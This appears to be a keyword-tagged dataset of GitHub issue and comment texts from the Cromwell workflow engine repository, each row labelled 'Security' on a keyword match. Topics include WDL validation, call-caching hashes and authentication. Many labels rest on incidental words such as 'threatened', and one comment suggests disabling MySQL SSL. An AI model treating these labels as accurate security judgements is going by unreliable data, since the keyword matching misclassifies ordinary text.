Security,"This change updates CromwellDRSLocalizer to bring it in line with the DRS spec, which says that all hashes should be hexadecimal strings. See ticket for further context.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6970:100,hash,hashes,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6970,1,['hash'],['hashes']
Security,"This currently only throws an exception when it tries to call the task. Instead, it should not be able to generate a validated WOM graph in the first place:; ```wdl; workflow oops {; call oopsie; }. task oopsie {; String str; command { echo ${str} }; runtime { docker: docker_image }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3326:117,validat,validated,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3326,1,['validat'],['validated']
Security,"This does appear to work for 3 step but I'd like to add metadata assertions to the existing Centaur test assuming the PR doesn't get gulled out of existence. TODO. - [x] Set parent workflow into subworkflows; - [x] Fix input path localization; - [x] Make ""please turn on Docker"" an explicit thing in `core`; - [x] Unbreak all the conformance tests that are broken on this branch; - [x] Centaur assertions that the expected Docker images are being used; - [ ] Turn on conformance tests in backends that require Docker; - [ ] Fix globs on JES; - [ ] Fix inputs on JES; - [ ] Return validation failures to the caller",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3040:580,validat,validation,580,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3040,1,['validat'],['validation']
Security,"This enhancement allows EFS or any parallel file system that can be mounted to the computes, to be accessible to the workflow run through cromwell with AWS backend.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070:99,access,accessible,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070,1,['access'],['accessible']
Security,"This fails at runtime but we shouldn't even allow it to validate:. ```wdl; version 1.0; struct Foo {; Int foo_int; }. [...]. task bar {; input {; Foo f; }; command {; echo ~{f} # Bad interpolation, should be ~{f.foo_int}; }; }. ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3917:56,validat,validate,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3917,1,['validat'],['validate']
Security,"This fixes the problem at the point of expression evaluation... it seems like it might be easier (and a lot less fiddly?) to do the relative file resolution much earlier, at the point that inputs are being read in to the workflow in the first place. The `ValidatedWomNamespace` produced as part of workflow materialization contains a `womValueInputs` field... I wonder whether performing this mapping as part of creating that validated set of inputs would work?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618685855:255,Validat,ValidatedWomNamespace,255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618685855,2,"['Validat', 'validat']","['ValidatedWomNamespace', 'validated']"
Security,"This introduces a ~~`CallDescriptor`~~ `JobDescriptor` abstraction that I hope resembles what we'd want in the world of pluggable backends. Although this is a backend class, it holds a reference to a `WorkflowDescriptor` which still has tons of references to engine things which we plan to refactor out, possibly into backend. `CallDescriptor` currently interacts with `BackendCall`s because that's what Cromwell has right now. :smile: . There was one very special bit of weirdness about our backend handling exposed by `RetryableCallsSpec` where the backend passed to `WorkflowManagerActor` is not necessarily the same backend used to build `WorkflowDescriptor`s. :frowning: That could use some extra scrutiny by reviewers.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502:509,expose,exposed,509,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502,1,['expose'],['exposed']
Security,This is a design choice to allow workflow validation before inputs are known. You could list the required inputs and check them against what you have by running the [`inputs` command](https://cromwell.readthedocs.io/en/stable/WOMtool/#inputs).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7139#issuecomment-1551517865:42,validat,validation,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7139#issuecomment-1551517865,1,['validat'],['validation']
Security,"This is a minimal workflow that runs a task with a dynamic number of GPUs; ```version 1.0. workflow gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1003,validat,validation,1003,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757,1,['validat'],['validation']
Security,This is a possible WDL spec change with a suspected womtool validation bug riding shotgun; the womtool bug looks to have been resolved,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-464220393:60,validat,validation,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-464220393,1,['validat'],['validation']
Security,"This is also something we would want for our cluster. Users are not allowed to run docker containers on our HPC (that would give them root access :scream:). So we use cromwell on the command line instead. We modified our cromwell configuration to run with singularity containers instead of docker containers. Setting up a MySQL server somewhere is not easy for the average user. Furthermore we used to set up a MySQL server for all users on the cluster, but that meant they had to share a database user and password (they were all using the same configuration). This caused a lot of issues. . Mostly cromwell is run project based. So the call-caching is only interesting for that particular project. Also using a file-based database will automatically ensure that only people with rights to the share the project is on will have access. This is also of importance in a shared cluster environment. At LUMC we currently implement this by using the HSQLDB in-memory database with a persistence file. This has some disadvantages:; 1. Cromwell needs more memory compared to using a MySQL server; 2. The HSQLDB persistence files are huge, badly compressed (when compression is used). 3 GB is normal. Tarring and zipping will get this down to under <50 mb... ; 3. It is slower than using a MySQL server. I think that SQLite will solve problem 1 and 2. (3 is inherent to using a file-based DB). . Having a database is better than to have nothing at all, which is why many users are pining for SQLite. When looking into it I found the option for the persistence file. Although SQLite will be much better, this does not require any extra effort from the Cromwell developers and can already help out a lot of users. I will document how we did this in the Cromwell documentation so everyone can use this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-564437002:139,access,access,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-564437002,3,"['access', 'password']","['access', 'password']"
Security,"This is an attempt to make the separation between (JES / Local / SGE) and File systems (GCS, SharedFilesystem) more obvious. It enables implementation of more Backend / File systems combinations.; For example this wdl runs, on a Local cromwell instance :; Wdl: . ```; task hello {; String addressee; command {; echo ""Hello ${addressee}!""; }; output {; String fileoutput = read_string(stdout()); String salutation = read_string(""gs://tjeandet/wdl_input_public.txt""); }; }. workflow hello {; File infile; String instring = read_string(infile); call hello {input: addressee = instring}; }; ```. Inputs:. ```; {; ""hello.infile"": ""gs://tjeandet/wdl_input_public.txt""; }; ```. It also works with user-defined authentication for GCS (refresh token).; More tests / cleaning is needed before it's reviewable but I wanted to put it out there before Thanksgiving.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305:703,authenticat,authentication,703,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305,1,['authenticat'],['authentication']
Security,"This is good for casual users, thanks @kshakir. On Tue, Oct 18, 2016 at 10:25 AM, kshakir notifications@github.com wrote:. > I feel uneasy recommending an unencrypted connection to a database,; > especially when the MySQL team went out of their way to start warning about; > this issue.; > ; > That said, the simplest copypasta you can use to remove that warning is to; > pass the specified parameter in your database url:; > ; > In this stanza, change the url from:; > ; > db {; > driver = ""com.mysql.jdbc.Driver""; > url = ""jdbc:mysql://host/cromwell""; > user = ""user""; > password = ""pass""; > connectionTimeout = 5000; > }; > ; > To:; > ; > db {; > driver = ""com.mysql.jdbc.Driver""; > url = ""jdbc:mysql://host/cromwell?useSSL=false""; > user = ""user""; > password = ""pass""; > connectionTimeout = 5000; > }; > ; > Or if there are already other params already on your url, append using ""&""; > instead of ""?"":; > ; > db {; > driver = ""com.mysql.jdbc.Driver""; > url = ""jdbc:mysql://host/cromwell?other=param&useSSL=false""; > user = ""user""; > password = ""pass""; > connectionTimeout = 5000; > }; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1591#issuecomment-254523992,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ACDXk53aShDWYxlKJyOGeGW4XyTntKdFks5q1NbxgaJpZM4KZ1eV; > . ## . Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1591#issuecomment-254525171:573,password,password,573,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1591#issuecomment-254525171,6,['password'],['password']
Security,"This is green and actually does appear to work with a couple of mods to the three-step workflow, one to fake the `ps` for deterministic results, another to fix a bug in the wc command. But this seriously needs refactoring:; 1. Proper concurrency handling for store updates. The current code is awful, the mutable stores are just passed around the various concurrently executing actors. Probably the stores should be behind an actor which the CallActor and WorkflowActor would `ask` for queries or updates, and then compose a `pipeTo` with the `Future` response.; 2. While the potential parallelism of the cgrep and wc calls does appear to work as intended, the current test does not assert this.; 3. The call dependency determination only works for member access expressions and is kind of gross.; 4. The connection of inputs to outputs requires member access expressions and uses logic very much like point 3. Also the way outputs are copied to inputs in the symbol store seems clunky and wasteful; if the input expressions could be truly evaluated at call invocation it wouldn't be necessary to create copies of this data.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/20:756,access,access,756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/20,2,['access'],['access']
Security,This is handled differently now. We hash the runtime attribute `docker` value into a fixed-length MD5 string,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-253928605:36,hash,hash,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-253928605,1,['hash'],['hash']
Security,"This is mainly just moving stuff around, pulling the metadata based routes into a separate trait out of CromwellApiService. . The **meat** of this was peeling out the inner bits of the metadata route logic into separate/composable functions so that I can access them via other incoming work. . Because @mcovarr are actively poking at the same areas of the code I wanted to get this more basic refactor out ASAP and can follow up with further refactoring at some later point when he's done.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4246:255,access,access,255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4246,1,['access'],['access']
Security,This is my attempt at addressing issue #4608 . - add `cpuPlatform` as a new runtime attribute; - contents are not validated; they're passed on directly to PAPI V2,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4609:114,validat,validated,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4609,1,['validat'],['validated']
Security,"This is the PR I threatened in #2754 that just renames all the `WdlStuff` to `WomStuff`. This shouldn't need a real review. This was 100% IDE driven except for fixing the aftereffects of what appears to have been an IDE bug, and also patching one goofy test.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2755:17,threat,threatened,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2755,1,['threat'],['threatened']
Security,"This is to enable running cromwell (on JES) in single workflow mode and to use the authentication of the user for bucket access. This ticket is to provide documentation on how to do that. @Horneth and @kshakir helped me do it, but I'd like general instructions so that we do not have to nag the red team. I cannot recall all of the steps.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2100:83,authenticat,authentication,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2100,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"This isn't due to the IDE, it's a readability thing for some definition of readability. These functions are effectively methods on `AstNode` but we can't write them as methods because we don't have (easy) access to the underlying class. In this case the implicit class is merely a vector to insert those methods so we aren't calling them as functions. This way it's clear that `foo` is acting on `a` when you say `a.foo(x)` instead of `foo(a, x)`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/50#issuecomment-112552200:205,access,access,205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/50#issuecomment-112552200,2,['access'],['access']
Security,"This issue was prompted by the following thread on the forum: https://gatkforums.broadinstitute.org/wdl/discussion/10347/localization-via-hard-link-has-failed. By default, cromwell does not specify a user when running docker, which leads to two issues:. Firstly, it will run each tasks as whatever user the docker image specifies, typically 'root' as this is the default. This means that depending on how the docker image was build, a completely random user is suddenly the owner of your output files. For example, if the user inside the docker container has UID 1042, this could map to a completely unrelated user on the host system, who is suddenly the owner of your output files. Related to this issue is the fact that all output files have to be world-readable by default, or else the cromwell process will not have read access to the files it has just created (which are now owned by UID 1042). This is not desireable when cromwell is run on a system with many users, some of which should not have read access to eachothers data (for example when working with patient data). As a solution, I propose to change the default docker invocation to run the analysis as $EUID by default. This works even when the EUID is not mapped to a valid user within the docker image, and ensures that the cromwell user is the owner of all the files generated by docker. From man bash: ""EUID Expands to the effective user ID of the current user, initialized at shell startup. This variable is readonly."" , so it should be available on every system. This solution makes cromwell act more secure by default, and will also solve the issue of copying over data files as discussed on the forum and in #2620",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2658:825,access,access,825,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2658,3,"['access', 'secur']","['access', 'secure']"
Security,"This line in the stack trace indicates the root cause:. ```; at software.amazon.awssdk.services.s3.S3Client.listBuckets(S3Client.java:2184); ```. The permissions for the Cromwell server currently only provide full access to the S3 bucket specified in the CloudFormation template. Adding the `AmazonS3ReadOnlyAccess` managed policy to the server's instance profile fixes this, but I wonder if it can be more refined. Specifically, is there a case where a Cromwell server would need to read from more than one bucket?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-500068947:214,access,access,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-500068947,1,['access'],['access']
Security,"This looks like a more specific version of https://github.com/broadinstitute/cromwell/issues/2209 - to work around this I bet the validation will work without the string interpolation:; ```; output {; File gvcf = gvcf; File gvcf_index = gvcf + "".tbi""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298670361:130,validat,validation,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298670361,1,['validat'],['validation']
Security,"This may be a possible dupe. Below is a stack trace of a `java.nio.Path` operation that threw an IOException the first time, but would have likely succeeded if tried again. Ideally the read/write operation, wdl task, whole workflow, etc. should be retried at some later asynchronous time. In the particular case below, the JES initialization actor was attempting to write the authentication file when it received a common 503 error:. ```; 2017-01-23 05:37:49,143 cromwell-system-akka.dispatchers.engine-dispatcher-45 ERROR - WorkflowManagerActor Workflow b08cdbf3-08ea-4bfa-a612-c4452f120c84 failed (during InitializingWorkflowState): Failed to upload authentication file; java.io.IOException: Failed to upload authentication file; 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1.apply(JesInitializationActor.scala:61); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1.apply(JesInitializationActor.scala:58); 	at scala.Option.foreach(Option.scala:257); 	at cromwell.backend.impl.jes.JesInitializationActor.cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile(JesInitializationActor.scala:58); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.apply(JesInitializationActor.scala:52); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.apply(JesInitializationActor.scala:51); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.impl.jes.JesInitializationActor.beforeAll(JesInitializationActor.scala:51); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$initSequence$1$$anonfun$apply$1.apply(BackendWorkflowInitializationActor.scala:156); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$initSequence$1$$anonfun$apply$1.apply(BackendWorkflowInitializationActor.scala:155); 	at scala.concurrent.Future$$anonfun$flat",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1890:376,authenticat,authentication,376,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1890,3,['authenticat'],['authentication']
Security,"This might be conflating two issues, but in case it is related, another error we are consistently seeing that seems dependent on which docker container we use (which may be a red herring, but that's all I can narrow it down to), we'll run something and get this error: ; ```; ""callCaching"": {; ""hashFailures"": [; {; ""message"": ""[Attempted 1 time(s)] - NoSuchFileException: s3://s3.amazonaws.com/some-bucket/cromwell-tests/Kraken2_test_input.fastq.gz"",; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""s3://s3.amazonaws.com/some-bucket/cromwell-tests/Kraken2_test_input.fastq.gz""; }; ]; }; ],; ```. Meanwhile, the input location of the input file is this:; ```; ""inputs"": {; ""input_fastq"": {; ""format"": null,; ""location"": ""s3://some-bucket/cromwell-tests/Kraken2_test_input.fastq.gz"",; ""size"": null,; ""secondaryFiles"": [],; ""contents"": null,; ""checksum"": null,; ""class"": ""File""; },; ```; So it's being given a valid S3 URL but then when it's trying to get the hash, it's looking at an invalid S3 URL (the one with s3.amazonaws.com isn't valid, but wasn't supplied by us). Thoughts? Is this a separate issue?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457651066:295,hash,hashFailures,295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457651066,3,"['checksum', 'hash']","['checksum', 'hash', 'hashFailures']"
Security,"This proposal should give us more flexibility regarding docker tags while keeping the call caching safety on false positive / negative. Docker runtime attributes with docker hashes do not need any additional processing. All logic in this ticket applies to docker runtime attributes with a ""floating"" tag, which will be referred as ""tag"" in this issue. In all cases, if Cromwell fails to retrieve the docker hash for a task, for any reason, the corresponding call(s) will NOT be eligible for call caching, neither read nor write, regardless of the call caching configuration in effect. **When to get the hashes and what to do with them:**. 1. Cromwell will lookup the hashes corresponding to docker tags, for all docker attributes in all tasks in a workflow and its subworkflows, at Materialization time.; If the runtime attribute value can't be determined, the task in question will be ineligible for call caching. The only case when that should be true is if the attribute is an expression with variables depending on previous tasks being run. 2. If the hash lookup succeed, Cromwell will use that hash to perform any call cache read / write according to the call caching configuration in effect. It will also provide that hash, along with the original floating tag, to the backend when the job gets dispatched. 3. Backends will choose wether to use the hash or the floating tag. They will report to the engine which one they used, so that the engine can send this information to the metadata. **How to get the hash:**. 1. How to get the hash depends on the backend. Which means, at this time, that only workflows for which the backend is known statically at workflow submission time will be supported. 2. If the task is expected to run on the **Local Backend**, Cromwell will attempt to find the hash corresponding to the tag on the machine where it's being run. This first attempt must be done without executing a `pull` to avoid overriding the current local image, if it exits, with the remote rep",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048:174,hash,hashes,174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048,4,['hash'],"['hash', 'hashes']"
Security,"This reverts #7143 and adds an older type of Application Insights log integration. The newer version didn't give us enough control over what logs were sent. Specifically, the fact that Cromwell uses a per-workflow logger (to create user-accessible log files) in addition to the root logger resulted in all workflow-related messages being duplicated in Application Insights.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7157:237,access,accessible,237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7157,1,['access'],['accessible']
Security,This reworks the JES Authentication schema in such a way that:; - All JES calls (launching a VM) are requested using the Cromwell Service Account (CSA) passed in through the configuration.; - The upload / delete of the authentication file to GCS is also done using CSA.; - All other GCS interactions are done using the user's credentials (with refresh token coming from WF options + clientID/secrets in the conf).; - a `billing_bucket` workflow option has been added that sets the gcs path where cromwell will write the auth.json file,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/295:21,Authenticat,Authentication,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/295,2,"['Authenticat', 'authenticat']","['Authentication', 'authentication']"
Security,This seems functionally correct to me... but is it easy to add a test case for this? . I'm slightly worried that the `override def getScheme: String` function could be being used elsewhere in the system - and that might cause problems when `drs://` files are accessed later on.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5115#issuecomment-521012487:259,access,accessed,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5115#issuecomment-521012487,1,['access'],['accessed']
Security,"This seems like a bug. In my inputs.json, I have an input file that is a URL. Cromwell (v84) fails to pull it when I'm not using ""Local"" as a backend. The only difference between a working case and failed case is the name of the backend in the cromwell config. If you just change the name from ""Local"" to ""MyLocal"", it will fail. For example,. this works; ```; default = ""Local""; providers; {; Local; ```. And this fails; ```; default = ""MyLocal""; providers; {; MyLocal; ```. Command to reproduce error. export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf \; -Dbackend.providers.Local.config.dockerRoot=$(pwd)/cromwell-executions \; -Dbackend.providers.Local.config.root=$(pwd)/cromwell-executions \; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json. Error:; java.lang.IllegalArgumentException: Could not build the path ""https://portal.nersc.gov/cfs/m342/jaws/test_data/sample.fastq"". It may refer to a filesystem not supported by this instance of Cromwell. Supported filesystems are: MacOSXFileSystem. Failures: . Required files; [test-files.zip](https://github.com/broadinstitute/cromwell/files/10387814/test-files.zip)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6977:552,secur,security,552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977,1,['secur'],['security']
Security,"This seems like a good candidate to expose to some posthumous you know whating, at least to the extent that it's possible currently.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/233#issuecomment-147091798:36,expose,expose,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/233#issuecomment-147091798,1,['expose'],['expose']
Security,"This seems similar/related to #1575. Is it possible for Cromwell to expose metadata about its current workflow to the steps that are running? Either via injecting ENV variables into containers, or potentially as inputs (as discussed in that issue?). Our use case is wanting to add a final step to our workflows that POSTs information about the run, its output paths, etc to an external tracking service.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7137:68,expose,expose,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137,2,"['expose', 'inject']","['expose', 'injecting']"
Security,"This sets up a mechanism to:; 1) Collect information about ""load"" from various part of the system; 2) Summarize this information and calculate a global load; 3) Notify parts of the system of changes in the global load. Current implementation is simple:; Only 2 load levels: `NormalLoad` and `HighLoad`; Actors reporting their load are:; - WriteMetadataActor; - JobStoreReadActor; - JobStoreWriteActor; - CallCacheWriteActor; - CallCacheReadActor; - KeyValueReadActor; - KeyValueWriteActor; - IoActor; - JesAPIQueryManagerActor. Additionally free memory is also being monitored and will go to `HighLoad` if going below a certain threshold. Global load == max(all load levels). So if one actor or more say their load is high, the global load will be high, otherwise normal.; The only actor listening to changes on the global load is the job token dispenser. It will stop dispensing tokens when load is high and start again when load is back to normal. At the exception of the IoActor, all the above mentioned actors have a queue in which they store work to be done. Their load is determined by comparing the size of this queue to a threshold.; The IoActor's queue is not easily accessible because hidden in the stream implementation and its size cannot easily be known. However we know when its full because we can't add to it anymore (this is when backpressure messages are sent). When that happens the IO actor reports its load to be `High`. When it hasn't had to backpressure for 10 seconds, the load returns to normal. There are many ways this could be made smarter but it already yields improvements in terms of stability and robustness. TODO: . - [x] Add Changelog; - [x] Configuration ? Lots of thresholds and values in this PR that could be configurable, how much and how do we want to configure ?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3366:1176,access,accessible,1176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3366,1,['access'],['accessible']
Security,"This should be a dynamic assert, based on the results of the task.; validation can take a while, so I would like the output to be taken and; given to the next task in the workflow while the validation is happening. I; would also like to control the response of the run (fail and stop, fail but; continue, warn and continue, do not validate) if there's an assertion; failure. On Tue, Jan 31, 2017 at 12:57 AM, Linlin Yan <notifications@github.com>; wrote:. > Sounds like some syntactic sugars are expected to simplify the fail method; > declaration.; >; > In addition, will such 'assert' be dynamic (in run-time) or static (in; > parse-time, before running any task)?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1146#issuecomment-276281986>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACnk0is0FEJp23Rx_5cXqrSPWKK8d2h_ks5rXs1ggaJpZM4JJrWM>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1146#issuecomment-276362089:68,validat,validation,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1146#issuecomment-276362089,6,['validat'],"['validate', 'validation']"
Security,"This ticket is a reminder to discuss what @cjllanwarne was saying Friday afternoon. I don't believe this is a release blocker, but noting it for future consideration:. The interplay between restart and caching is possibly not ideal. When restarting with cache read turned on, Cromwell will begin potentially expensive hash calculations on jobs that may have previously been running. However, Cromwell currently does this calculation before checking if jobs were actually running and recoverable, which if they were would make hash calculation unnecessary. . On the other hand, perhaps determining whether a job is running in the backend is more expensive than calculating hashes. Shrug. . Anyway, the current scheme is likely more accidental than intentional and would benefit from some discussion.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1441:318,hash,hash,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1441,3,['hash'],"['hash', 'hashes']"
Security,"This turns out to be easy to explain. Every file hash was being checked against the google API and was a fully blocking operation (complete with blocking retries). While within a call each file was checked serially (a problem in and of itself), when there were many calls running at once w/ File objects they'd each sit there and block. That's not a recipe for success",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/794#issuecomment-235082067:49,hash,hash,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/794#issuecomment-235082067,1,['hash'],['hash']
Security,"This wasn't as simple as just a one line ""add singularity to the list"" of cacheable attributes, because `singularity` is a user-generated attribute specified in the Config backend's configuration. So the change ended up being:. * Allow additional config allowing users to specify which runtime attributes are call-cacheable; * Wiring that through the runtime attribute validators to include the correct call-cacheable-ness; * Unit and centaur tests.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5543:369,validat,validators,369,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5543,1,['validat'],['validators']
Security,This way a server that doesn't have access to certain docker-hub repos could still run an individual workflow that used those images since that workflow would have different credentials than the server as a whole. This is especially helpful in situations where you share a server with many people who may not all have the same permissions.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2234:36,access,access,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2234,1,['access'],['access']
